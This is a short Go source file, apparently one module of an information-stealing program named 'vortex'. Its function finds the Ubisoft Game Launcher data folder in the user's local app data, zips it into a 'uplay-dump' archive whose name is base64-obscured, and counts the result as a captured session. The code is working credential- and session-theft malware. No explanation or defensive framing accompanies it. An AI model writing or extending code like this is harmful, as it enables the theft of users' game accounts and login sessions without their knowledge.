package softwares

import (
	"os"
	"path/filepath"
	"vortex/encrypt"
	"vortex/hutil"
)

func UplayDataDump(mainFolder string) error {

	uplayPath := filepath.Join(os.Getenv("LOCALAPPDATA"), "Ubisoft Game Launcher")
	if _, err := os.Stat(uplayPath); os.IsNotExist(err) {
		return nil
	}

	if err := hutil.ZipFolder(filepath.Base(uplayPath), uplayPath, filepath.Join(mainFolder, encrypt.B64Util("uplay-dump.zip", 0)), "XX"); err != nil {
		return err
	}

	hutil.Sessions++

	return nil
}
